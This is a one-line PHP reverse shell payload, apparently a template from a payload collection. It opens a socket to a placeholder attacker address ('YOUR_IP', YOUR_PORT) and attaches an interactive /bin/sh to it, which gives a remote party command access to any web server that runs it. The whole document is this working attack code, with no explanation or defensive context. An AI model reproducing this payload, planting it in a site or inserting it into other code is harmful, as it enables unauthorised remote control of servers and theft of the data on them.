<?php $sock=fsockopen("YOUR_IP",YOUR_PORT);proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?> 
